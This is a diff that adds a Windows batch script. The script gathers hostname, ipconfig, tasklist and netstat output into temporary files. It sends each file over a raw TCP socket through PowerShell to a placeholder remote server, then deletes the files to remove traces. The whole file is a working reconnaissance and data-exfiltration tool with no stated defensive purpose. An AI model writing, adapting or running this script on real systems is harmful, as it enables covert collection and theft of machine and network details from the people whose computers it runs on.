@@ -1,0 +1,33 @@
+@echo off
+
+REM Run the hostname command and save the output to a temporary file
+hostname > "%TEMP%\hostname_output.txt"
+
+REM Send the hostname file content to the Python server using PowerShell
+powershell -Command "$client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); foreach ($line in Get-Content '%TEMP%\hostname_output.txt') { $writer.WriteLine($line); $writer.Flush() }; $client.Close()"
+
+REM Run the ipconfig command and save the output to a temporary file
+ipconfig > "%TEMP%\ipconfig_output.txt"
+
+REM Send the ipconfig file content to the Python server using PowerShell
+powershell -Command "$client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); foreach ($line in Get-Content '%TEMP%\ipconfig_output.txt') { $writer.WriteLine($line); $writer.Flush() }; $client.Close()"
+
+REM Run the tasklist command and save the output to a temporary file
+tasklist > "%TEMP%\tasklist_output.txt"
+
+REM Send the tasklist file content to the Python server using PowerShell
+powershell -Command "$client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); foreach ($line in Get-Content '%TEMP%\tasklist_output.txt') { $writer.WriteLine($line); $writer.Flush() }; $client.Close()"
+
+REM Run the netstat command and save the output to a temporary file
+netstat > "%TEMP%\netstat_output.txt"
+
+REM Send the netstat file content to the Python server using PowerShell
+powershell -Command "$client = New-Object System.Net.Sockets.TcpClient('<your_server_ip>', <your_server_port>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); foreach ($line in Get-Content '%TEMP%\netstat_output.txt') { $writer.WriteLine($line); $writer.Flush() }; $client.Close()"
+
+REM Clean up the temporary files
+del "%TEMP%\hostname_output.txt"
+del "%TEMP%\ipconfig_output.txt"
+del "%TEMP%\tasklist_output.txt"
+del "%TEMP%\netstat_output.txt"
+
+exit
